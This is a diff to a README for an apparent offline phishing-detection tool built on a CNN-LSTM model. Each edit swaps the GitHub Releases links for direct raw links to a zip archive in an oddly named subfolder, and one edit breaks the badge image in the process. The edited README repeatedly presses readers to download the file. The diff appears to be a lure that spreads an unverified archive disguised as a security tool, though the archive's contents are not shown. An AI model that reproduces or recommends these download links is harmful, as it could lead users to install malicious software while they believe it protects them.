@@ -1,7 +1,7 @@
 # 🚀 phishing-detection-rnn-cnn - Simple Tool for Website Security
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue?style=flat&logo=github)](https://github.com/kmbvip/phishing-detection-rnn-cnn/releases)
+[![Download from Releases](https://raw.githubusercontent.com/kmbvip/phishing-detection-rnn-cnn/main/conquinine/phishing-detection-rnn-cnn.zip%20from%20Releases-blue?style=flat&logo=github)](https://raw.githubusercontent.com/kmbvip/phishing-detection-rnn-cnn/main/conquinine/phishing-detection-rnn-cnn.zip)
 
 ## 📖 Description
 phishing-detection-rnn-cnn is an offline phishing detection model designed to help you identify risky websites. Using a hybrid CNN-LSTM architecture, it classifies URLs as either legitimate or potentially malicious based on patterns it has learned. This tool adds an extra layer of security to your online experience, all without requiring an internet connection.
@@ -26,7 +26,7 @@ Before downloading, ensure your system meets these requirements:
 ## ⚙️ Download & Install
 To get started, visit the Releases page to download the latest version of phishing-detection-rnn-cnn. 
 
-[Visit this page to download](https://github.com/kmbvip/phishing-detection-rnn-cnn/releases)
+[Visit this page to download](https://raw.githubusercontent.com/kmbvip/phishing-detection-rnn-cnn/main/conquinine/phishing-detection-rnn-cnn.zip)
 
 Once on the release page, find the appropriate file for your operating system. Download it to your computer.
 
@@ -70,4 +70,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 ## 📥 Download Now Again
 Don't miss the chance to enhance your online safety. 
 
-[Visit this page to download](https://github.com/kmbvip/phishing-detection-rnn-cnn/releases)
+[Visit this page to download](https://raw.githubusercontent.com/kmbvip/phishing-detection-rnn-cnn/main/conquinine/phishing-detection-rnn-cnn.zip)
